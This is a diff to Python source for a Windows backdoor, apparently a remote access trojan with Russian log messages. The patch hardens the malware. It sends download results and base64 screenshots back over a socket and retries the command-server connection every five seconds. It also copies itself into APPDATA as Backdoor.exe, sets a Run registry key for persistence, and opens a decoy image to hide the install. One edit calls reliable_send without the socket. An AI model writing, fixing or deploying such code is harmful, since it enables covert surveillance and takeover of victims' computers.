@@ -60,10 +60,10 @@ def download(url):
         with open(file_name, "wb") as out_file:
             out_file.write(get_response.content)
         logging.info(f"[+] Файл {file_name} успешно скачан!")
-        return f"[+] Файл {file_name} успешно скачан!"
+        reliable_send(f"[+] Файл {file_name} успешно скачан!", sock)
     except Exception as e:
         logging.error(f"[!!] Ошибка скачивания файла: {e}")
-        return f"[!!] Ошибка скачивания файла: {e}"
+        reliable_send(f"[!!] Ошибка скачивания файла: {e}", sock)
 
 
 def screenshot():
@@ -72,7 +72,7 @@ def screenshot():
             screenshot_file = sct.shot(output="screenshot.png")
         with open(screenshot_file, "rb") as screen_file:
             logging.info("[+] Скриншот успешно создан")
-            return base64.b64encode(screen_file.read())
+            reliable_send(base64.b64encode(screen_file.read()))
     finally:
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
@@ -166,17 +166,26 @@ def connection():
             logging.info("[+] Успешное подключение к серверу")
             shell(sock)
         except socket.error as e:
-            logging.error(f"[!!] Ошибка подключения: {e}")
+            logging.warning(f"[!!] Сервер недоступен. Повторная попытка через 5 секунд. Ошибка: {e}")
             time.sleep(5)
         except Exception as e:
-            logging.error(f"[!!] Ошибка в connection: {e}")
-            break
+            logging.error(f"[!!] Неизвестная ошибка в connection: {e}")
+            time.sleep(5)
 
 
 def setup_autorun():
     location = os.environ["APPDATA"] + "\\Backdoor.exe"
+    
+    # Проверка существования файла в APPDATA
     if not os.path.exists(location):
-        shutil.copyfile(sys.executable, location)
+        try:
+            shutil.copyfile(sys.executable, location)
+            logging.info(f"[+] Файл скопирован в {location}")
+        except Exception as e:
+            logging.error(f"[!!] Ошибка копирования файла в APPDATA: {e}")
+            return  # Прерываем, если копирование не удалось
+
+        # Запись в реестр
         try:
             with winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
@@ -185,18 +194,26 @@ def setup_autorun():
                 winreg.KEY_SET_VALUE,
             ) as key:
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
+                logging.info("[+] Запись в реестр выполнена успешно")
+        except PermissionError:
+            logging.error("[!!] Недостаточно прав для записи в реестр")
         except Exception as e:
             logging.error(f"[!!] Ошибка записи в реестр: {e}")
-        try:
-            if hasattr(sys, "_MEIPASS"):
-                image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
-            else:
-                image_path = os.path.join(os.getcwd(), "aaa.jpg")
-            if os.path.exists(image_path):
-                subprocess.Popen(["start", image_path], shell=True)
-                logging.info("[+] Картинка открыта при запуске")
-        except:
-            logging.error(f"[!!] Ошибка открытия картинки: {e}")
+
+    # Попытка открыть картинку
+    try:
+        if hasattr(sys, "_MEIPASS"):  # Упакованный файл
+            image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
+        else:  # Рядом с исполняемым файлом
+            image_path = os.path.join(os.getcwd(), "aaa.jpg")
+
+        if os.path.exists(image_path):
+            subprocess.Popen(["start", image_path], shell=True)
+            logging.info(f"[+] Картинка успешно открыта: {image_path}")
+        else:
+            logging.error(f"[!!] Картинка не найдена по пути: {image_path}")
+    except Exception as e:
+        logging.error(f"[!!] Ошибка при открытии картинки: {e}")
 
 
 if __name__ == "__main__":
